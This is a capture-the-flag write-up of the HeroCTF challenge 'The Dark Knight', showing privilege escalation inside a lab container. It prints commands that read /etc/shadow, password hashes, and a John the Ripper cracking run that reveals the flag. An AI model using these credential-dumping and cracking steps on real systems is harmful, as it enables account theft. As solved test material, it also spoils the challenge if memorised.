# The Dark Knight

By [Siorde](https://github.com/Siorde)

## Description  
The Batman is lurking in the shadows, ready to take down the next criminal.
Usually we don't mind, but he has some critical intel he won't share about the
Joker : his password on the network. Gordon, find who he is and get the intel.
We know it's one of the users of this network.

Good luck.

## Solution  
Once i logged on the serveur, i tried to cat /etc/shadow and /etc/passwd. The
acces was denied for the /etc/shadow but i got the /etc/passwd  
```  
gordon@5653f407bf8b:~$ cat /etc/passwd  
root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin  
gnats:x:41:41:Gnats Bug-Reporting System
(admin):/var/lib/gnats:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin  
systemd-network:x:101:102:systemd Network
Management,,,:/run/systemd/netif:/usr/sbin/nologin  
systemd-resolve:x:102:103:systemd
Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin  
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin  
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin  
gordon:x:1000:1000:,,,:/home/gordon:/bin/bash  
joker:x:1001:1001:,,,:/home/joker:/bin/bash  
bradley_warner:x:1002:42:,,,:/home/bradley_warner:/bin/bash  
black_williams:x:1003:1003:,,,:/home/black_williams:/bin/bash  
brett_willis:x:1004:1004:,,,:/home/brett_willis:/bin/bash  
bonnie_winter:x:1005:1005:,,,:/home/bonnie_winter:/bin/bash  
```  
I noticed that bradley_warner was is in the group 42 instead of 1002. So i
looked at what group it was :  
```  
gordon@5653f407bf8b:~$ groups bradley_warner  
bradley_warner : shadow  
```  
It match what was written in the description of the challenge and with a "ls
-al /etc", we can see that this group can cat /etc/shadow.  
  
I cat the only file in the home of bradley_warner :  
```  
gordon@5653f407bf8b:~$ cat /home/bradley_warner/.ssh/authorized_keys  
ssh-rsa
AAAAB3NzaC1yc2EAAAADAQABAAABAQDledZGWxygUWUe1jv1R7J18KKvMVVXKEG0wmZi53FFdWRanbgLSIEOL8LlfgG8gGCgljo/X/ezZIFEeBGl4ioJeWZbHghgwdW3W24bgeGLf+C2fyLviY+yNXTLCx9tBFtrksB7MBaKFD1CGCRjqdWQ3qOvSOXpQr0JVF/1R52oX3xQcABghD0UbOLq+31KsMpWw5fmW0Nd5a60UUQWKyju+ZvsCvnaPrxs+DvABpoMAriNOGG4x/5zZGLNb+dvKrv+6QjHee+lXeHMoCPVWf8q8rhy8zYfSR4ZXsHsKEhfSgZ10QrfSgoWCdM2P1PUBvbXDIvrFzKbymKG7CwFOPQn
gordon@5ff44b32ff8a  
```  
So apparently gordon can do a ssh for the user bradley_warner :  
```  
ssh bradley_warner@localhost  
```  
Now we can see the /etc/shadow :  
```  
bradley_warner@5653f407bf8b:~$ tail /etc/shadow  
systemd-network:*:18742:0:99999:7:::  
systemd-resolve:*:18742:0:99999:7:::  
messagebus:*:18742:0:99999:7:::  
sshd:*:18742:0:99999:7:::  
gordon:$6$EWpyf71C$Flz7gbn/SiQhZwAgRIqoXOG56PT2lK0aXjvM0ubY/52VBdESWS6iv0R6ZdcCWTZ/nSIBIMpXybqfyq5BGjLNr0:18742:0:99999:7:::  
joker:$6$R7sLJXQ9$wtS/caquqtt3l3ElAbyBILd4ylOCIOHXTJBC.o9qu48p0mXaTorvd0pD.H.i3buECHGzHbBT3XFEtGg8EoX650:18742:0:99999:7:::  
bradley_warner:*:18742:0:99999:7:::  
black_williams:*:18742:0:99999:7:::  
brett_willis:*:18742:0:99999:7:::  
bonnie_winter:*:18742:0:99999:7:::  
```  
We only need to brutforce the jocker password :  
```  
$ echo
"joker:$6$R7sLJXQ9$wtS/caquqtt3l3ElAbyBILd4ylOCIOHXTJBC.o9qu48p0mXaTorvd0pD.H.i3buECHGzHbBT3XFEtGg8EoX650:1001:1001:,,,:/home/joker:/bin/bash"
> unshadowed.txt  
$ john -wordlist=./rockyou.txt unshadowed.txt  
Loaded 1 password hash (crypt, generic crypt(3) [?/64])  
Press 'q' or Ctrl-C to abort, almost any other key for status  
ilovebatman      (joker)  
```  
So the flag is Hero{ilovebatman} !  

Original writeup (https://github.com/Nameshield-
CTF/WriteUps/tree/master/heroctf/system/the-dark-knight).